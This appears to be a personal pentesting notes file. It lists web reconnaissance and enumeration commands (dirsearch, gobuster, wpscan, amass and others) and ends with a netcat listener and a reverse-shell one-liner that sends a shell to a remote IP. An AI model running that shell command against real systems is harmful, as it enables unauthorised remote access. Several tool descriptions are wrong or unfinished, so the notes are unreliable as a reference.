All commands and links i need to sort.  


Recon  
Find Vuln  
Exploit  
Evlate   
Repeat  
ZAP better then burp  

## Web Enumeration ##
wappalyzer - good plugin for looking at website platforms or software. add this to my hacking soe

crt.sh - website to search for subdomains.  

curl -u http://website - display website header and info  

dirsearch -u http://website - enumerates subdirectories  
gobuster dir -u http://website -w /usr/share/seclist - enumerates subdirectories  
gobuster dns -d http://website -w dns Jhaddix.txt - enumerates subdirectories  

sublist3r -d http://website - enumerates subdirectories  (add -t 10 for multithread or faster search)

wpscan --url http://website --enumerate  u for user, p for plugins, t for themes  
wpscan --url http://website --enumerate  vp,vt --plugins-detection aggressive (need api token)  

amass enum -d domain --passive - gives XXXX  

python3 -m http.server 80 -- Start at adhoc webserver, good for quickly sharing files.    
  

## Online Tools ##
https://gchq.github.io/CyberChef/  -  

nc -lvp 1337  
nc -e /bon/sh ip 1337   
